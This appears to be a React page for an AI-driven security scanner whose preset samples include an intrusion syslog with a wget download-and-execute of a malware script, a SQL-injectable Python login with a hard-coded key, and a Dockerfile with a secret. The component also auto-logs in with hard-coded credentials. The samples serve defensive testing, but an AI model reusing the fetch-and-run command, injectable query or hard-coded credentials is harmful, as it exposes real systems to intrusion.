import { useState, useEffect, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { Send, Terminal, AlertCircle, CheckCircle2, HelpCircle } from 'lucide-react';
import PipelineTimeline from '@/components/pipeline-timeline/PipelineTimeline';
import { motion, AnimatePresence } from 'framer-motion';
import { useAuth } from '@/store/auth';

interface ScanEvent {
  type: string;
  agent?: string;
  session_id?: string;
  event?: string;
  details?: Record<string, unknown>;
  question?: string;
  input_type?: string;
  pipeline?: string;
  confidence?: number;
  error?: string;
  finding_count?: number;
  timestamp?: string;
}

const EVENT_COLOR: Record<string, string> = {
  agent_started: 'text-blue-400',
  agent_completed: 'text-green-400',
  agent_error: 'text-red-400',
  classified: 'text-purple-400',
  needs_clarification: 'text-yellow-400',
  trace: 'text-slate-400',
  state_snapshot: 'text-indigo-300',
};

const PRESET_SAMPLES = {
  syslog: {
    label: '🚨 Syslog Intrusion',
    type: 'LOGS',
    text: `Jul 29 14:32:01 webserver sshd[12345]: Failed password for root from 185.220.101.47 port 54231 ssh2
Jul 29 14:32:03 webserver sshd[12345]: Failed password for admin from 185.220.101.47 port 54231 ssh2
Jul 29 14:32:07 webserver sshd[12346]: Accepted password for ubuntu from 185.220.101.47 port 54232 ssh2
Jul 29 14:32:15 webserver sudo[12350]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
Jul 29 14:32:25 webserver bash[12355]: wget http://95.214.55.138/malware.sh -O /tmp/.hidden
Jul 29 14:32:30 webserver bash[12355]: chmod +x /tmp/.hidden && /tmp/.hidden`
  },
  code: {
    label: '🛡️ Vulnerable Python SAST',
    type: 'CODE',
    text: `import sqlite3
import os

AWS_SECRET = "AKIA1234567890ABCDEF"

def login_user(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Vulnerable SQL Injection
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    return cursor.fetchone()`
  },
  cve: {
    label: '🔍 CVE Threat Intel',
    type: 'CVE',
    text: `CVE-2024-3094: Critical supply chain backdoor in xz-utils (liblzma) versions 5.6.0 and 5.6.1 enabling unauthorized remote SSH access.`
  },
  dockerfile: {
    label: '🐳 Dockerfile Audit',
    type: 'CODE',
    text: `FROM ubuntu:latest
# Runs as root user
ENV API_KEY="sk-live-prod-secretkey999"
RUN apt-get update && apt-get install -y curl wget netcat
EXPOSE 22 80 443 3306
CMD ["/bin/bash"]`
  }
};

export default function Scan() {
  const [input, setInput] = useState('');
  const [inputTypeHint, setInputTypeHint] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [events, setEvents] = useState<ScanEvent[]>([]);
  const [activeAgent, setActiveAgent] = useState<string | null>(null);
  const [completedAgents, setCompletedAgents] = useState<string[]>([]);
  const [errorAgent, setErrorAgent] = useState<string | null>(null);
  const [pipelineType, setPipelineType] = useState<'A' | 'B' | 'C'>('A');
  const [scanStatus, setScanStatus] = useState<string>('idle');
  const [clarificationQuestion, setClarificationQuestion] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const eventFeedRef = useRef<HTMLDivElement | null>(null);
  const navigate = useNavigate();
  const { token, setAuth } = useAuth();

  const addEvent = useCallback((event: ScanEvent) => {
    setEvents(prev => [...prev, { ...event, timestamp: new Date().toISOString() }]);
    setTimeout(() => {
      if (eventFeedRef.current) {
        eventFeedRef.current.scrollTop = eventFeedRef.current.scrollHeight;
      }
    }, 50);
  }, []);

  const connectWebSocket = useCallback((sid: string) => {
    if (!token) return;
    const wsUrl = `${import.meta.env.VITE_WS_BASE_URL || 'ws://localhost:8000'}/api/v1/ws/${sid}?token=${token}`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => addEvent({ type: 'system', event: 'WebSocket connected — streaming live updates' });

    ws.onmessage = (msg) => {
      try {
        const event: ScanEvent = JSON.parse(msg.data);
        if (event.type === 'ping') return;

        addEvent(event);

        switch (event.type) {
          case 'agent_started':
            setActiveAgent(event.agent || null);
            break;
          case 'agent_completed':
            setCompletedAgents(prev => event.agent ? [...prev, event.agent!] : prev);
            setActiveAgent(null);
            break;
          case 'agent_error':
            setErrorAgent(event.agent || null);
            setActiveAgent(null);
            break;
          case 'classified':
            if (event.pipeline === 'A' || event.pipeline === 'A_THEN_B') setPipelineType('A');
            else if (event.pipeline === 'C') setPipelineType('C');
            else setPipelineType('B');
            break;
          case 'needs_clarification':
            setClarificationQuestion(event.question || null);
            setScanStatus('awaiting_clarification');
            break;
          case 'state_snapshot':
            if (event.pipeline === 'A' || event.pipeline === 'A_THEN_B') setPipelineType('A');
            else if (event.pipeline === 'C') setPipelineType('C');
            break;
        }

        if (event.type === 'agent_completed' && event.agent === 'ExecReportingAgent') {
          setScanStatus('completed');
          setIsScanning(false);
          ws.close();
        }
      } catch (e) {
        console.error('WS parse error', e);
      }
    };

    ws.onerror = () => {
      addEvent({ type: 'system', event: 'WebSocket error — check backend connection' });
      setIsScanning(false);
      setScanStatus('failed');
    };

    ws.onclose = () => {
      addEvent({ type: 'system', event: 'WebSocket closed' });
    };
  }, [token, addEvent]);


  const ensureAuth = useCallback(async () => {
    if (token) return token;
    try {
      const apiBase = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000/api/v1';
      await fetch(`${apiBase}/auth/local/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'secops_admin', password: 'password123' })
      });
      const res = await fetch(`${apiBase}/auth/local/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'secops_admin', password: 'password123' })
      });
      if (res.ok) {
        const data = await res.json();
        setAuth(data.access_token, { id: data.user_id, username: data.username });
        setError(null);
        return data.access_token;
      }
    } catch (e) {
      console.warn('Auto-auth failed:', e);
    }
    return null;
  }, [token, setAuth]);

  useEffect(() => {
    ensureAuth();
  }, [ensureAuth]);

  useEffect(() => {
    return () => { wsRef.current?.close(); };
  }, []);

  const handleScan = async () => {
    if (!input.trim() || isScanning) return;
    const authToken = await ensureAuth();
    if (!authToken) { setError('Authentication failed. Check backend connection.'); return; }

    setIsScanning(true);
    setEvents([]);
    setCompletedAgents([]);
    setActiveAgent(null);
    setErrorAgent(null);
    setClarificationQuestion(null);
    setError(null);
    setScanStatus('running');

    try {
      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000'}/api/v1/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({ input: input.trim(), input_type_hint: inputTypeHint || undefined }),
      });

      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.detail || 'Scan request failed');
      }

      const data = await res.json();
      setSessionId(data.session_id);
      addEvent({ type: 'system', event: `Session created: ${data.session_id}` });

      // Connect WebSocket for live updates
      connectWebSocket(data.session_id);
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Failed to start scan';
      setError(msg);
      setIsScanning(false);
      setScanStatus('failed');
    }
  };

  const formatEventLine = (event: ScanEvent) => {
    const color = EVENT_COLOR[event.type] || 'text-slate-400';
    const prefix = event.agent ? `[${event.agent}]` : '[SYSTEM]';
    let msg = '';

    switch (event.type) {
      case 'agent_started': msg = `Starting execution...`; break;
      case 'agent_completed': msg = `Complete.${event.finding_count ? ` ${event.finding_count} findings.` : ''}`; break;
      case 'agent_error': msg = `ERROR: ${event.error}`; break;
      case 'classified': msg = `Input classified as ${event.input_type} → Pipeline ${event.pipeline} (confidence: ${((event.confidence || 0) * 100).toFixed(0)}%)`; break;
      case 'needs_clarification': msg = `Needs clarification: ${event.question}`; break;
      case 'trace': msg = `${event.event}${event.details ? ` — ${JSON.stringify(event.details).slice(0, 80)}` : ''}`; break;
      case 'system': msg = event.event || ''; break;
      default: msg = JSON.stringify(event).slice(0, 100);
    }

    return { color, prefix, msg };
  };

  const loadPreset = (key: keyof typeof PRESET_SAMPLES) => {
    const sample = PRESET_SAMPLES[key];
    setInput(sample.text);
    setInputTypeHint(sample.type);
  };

  return (
    <div id="scan-page" className="max-w-5xl mx-auto space-y-8 animate-in slide-in-from-bottom-4 duration-500">
      <div>
        <h1 className="text-3xl font-bold text-white mb-2">Initiate Analysis</h1>
        <p className="text-slate-400">Submit source code, security logs, CVE IDs, or repo URLs for autonomous threat analysis.</p>
      </div>

      {/* Input Panel */}
      <div className="glass-panel p-6 border-indigo-500/30 relative group">
        <div className="absolute inset-0 bg-gradient-to-br from-indigo-500/5 to-purple-500/5 rounded-xl pointer-events-none" />
        
        {/* Preset sample buttons */}
        <div className="mb-4">
          <p className="text-xs text-slate-400 font-medium mb-2 uppercase tracking-wider">Quick Use Cases / Try Sample Inputs:</p>
          <div className="flex flex-wrap gap-2">
            {Object.entries(PRESET_SAMPLES).map(([key, sample]) => (
              <button
                key={key}
                type="button"
                onClick={() => loadPreset(key as keyof typeof PRESET_SAMPLES)}
                disabled={isScanning}
                className="text-xs bg-slate-800/90 hover:bg-indigo-600/30 text-indigo-300 border border-slate-700/80 hover:border-indigo-500/50 px-3 py-1.5 rounded-md transition-all shadow-sm flex items-center gap-1.5"
              >
                {sample.label}
              </button>
            ))}
          </div>
        </div>

        <div className="flex items-center gap-2 mb-3 text-indigo-400 font-mono text-sm">
          <Terminal className="w-4 h-4" />
          <span>sentinel_ai &gt; analyze</span>
        </div>
        <textarea
          id="scan-input"
          className="w-full h-44 bg-slate-900/80 border border-slate-700 rounded-lg p-4 text-slate-300 font-mono text-sm focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all resize-none shadow-inner"
          placeholder="Paste source code, syslog output, CVE IDs (CVE-2024-3094), or a GitHub repo URL..."
          value={input}
          onChange={(e) => setInput(e.target.value)}
          disabled={isScanning}
        />
        <div className="mt-3 flex items-center justify-between gap-4">
          <select
            id="input-type-hint"
            className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-slate-300 text-sm focus:outline-none focus:border-indigo-500"
            value={inputTypeHint}
            onChange={(e) => setInputTypeHint(e.target.value)}
            disabled={isScanning}
          >
            <option value="">Auto-classify (recommended)</option>
            <option value="CODE">Source Code</option>
            <option value="LOGS">Security Logs / Syslog</option>
            <option value="REPO_URL">GitHub Repository URL</option>
            <option value="CVE">CVE ID / Vulnerability</option>
            <option value="IOC">Incident IOCs</option>
          </select>
          <button
            id="scan-submit-btn"
            onClick={handleScan}
            disabled={!input.trim() || isScanning}
            className="flex items-center gap-2 bg-indigo-600 hover:bg-indigo-500 text-white px-6 py-2.5 rounded-lg font-medium transition-all shadow-[0_0_15px_rgba(99,102,241,0.4)] disabled:opacity-50 disabled:shadow-none disabled:cursor-not-allowed"
          >
            <Send className="w-4 h-4" />
            {isScanning ? 'Executing Pipeline...' : 'Launch Agents'}
          </button>
        </div>
        {error && (
          <div className="mt-3 flex items-center gap-2 text-red-400 text-sm">
            <AlertCircle className="w-4 h-4" />
            {error}
          </div>
        )}
      </div>

      {/* Live Execution View */}
      <AnimatePresence>
        {(isScanning || completedAgents.length > 0 || events.length > 0) && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
            {/* Status Banner */}
            <div className={`flex items-center gap-3 px-4 py-3 rounded-lg text-sm font-medium ${
              scanStatus === 'completed' ? 'bg-green-500/10 border border-green-500/30 text-green-400' :
              scanStatus === 'failed' ? 'bg-red-500/10 border border-red-500/30 text-red-400' :
              scanStatus === 'awaiting_clarification' ? 'bg-yellow-500/10 border border-yellow-500/30 text-yellow-400' :
              'bg-indigo-500/10 border border-indigo-500/30 text-indigo-400'
            }`}>
              {scanStatus === 'completed' ? <CheckCircle2 className="w-4 h-4" /> :
               scanStatus === 'awaiting_clarification' ? <HelpCircle className="w-4 h-4" /> :
               <div className="w-4 h-4 rounded-full border-2 border-current border-t-transparent animate-spin" />}
              {scanStatus === 'completed' && `Analysis complete — `}
              {scanStatus === 'running' && 'Pipeline executing — monitoring live...'}
              {scanStatus === 'failed' && 'Pipeline failed — check event feed'}
              {scanStatus === 'awaiting_clarification' && 'Clarification needed'}
              {scanStatus === 'completed' && sessionId && (
                <button onClick={() => navigate(`/sessions/${sessionId}`)} className="underline hover:text-green-300 ml-1">
                  View full report →
                </button>
              )}
            </div>

            {/* Clarification */}
            {clarificationQuestion && (
              <div className="glass-panel p-4 border-yellow-500/30 bg-yellow-500/5">
                <p className="text-yellow-300 text-sm font-medium mb-1">Clarification Required</p>
                <p className="text-slate-300 text-sm">{clarificationQuestion}</p>
                <p className="text-slate-500 text-xs mt-2">Please start a new scan with an explicit input type selected above.</p>
              </div>
            )}

            {/* Pipeline Timeline */}
            <PipelineTimeline
              pipelineType={pipelineType}
              activeAgent={activeAgent}
              completedAgents={completedAgents}
              errorAgent={errorAgent}
            />

            {/* Event Feed */}
            <div className="glass-panel p-6 bg-black/40">
              <h4 className="text-slate-400 text-xs font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                Live Event Feed
              </h4>
              <div ref={eventFeedRef} className="font-mono text-xs space-y-1 h-52 overflow-y-auto pr-2 sentinel-scrollbar">
                {events.map((event, i) => {
                  const { color, prefix, msg } = formatEventLine(event);
                  return (
                    <motion.div
                      key={i}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      className={`${color} flex gap-2`}
                    >
                      <span className="text-slate-600 shrink-0">{event.timestamp?.slice(11, 19)}</span>
                      <span className="text-slate-500 shrink-0">{prefix}</span>
                      <span>{msg}</span>
                    </motion.div>
                  );
                })}
                {isScanning && (
                  <div className="text-indigo-400 animate-pulse">_</div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
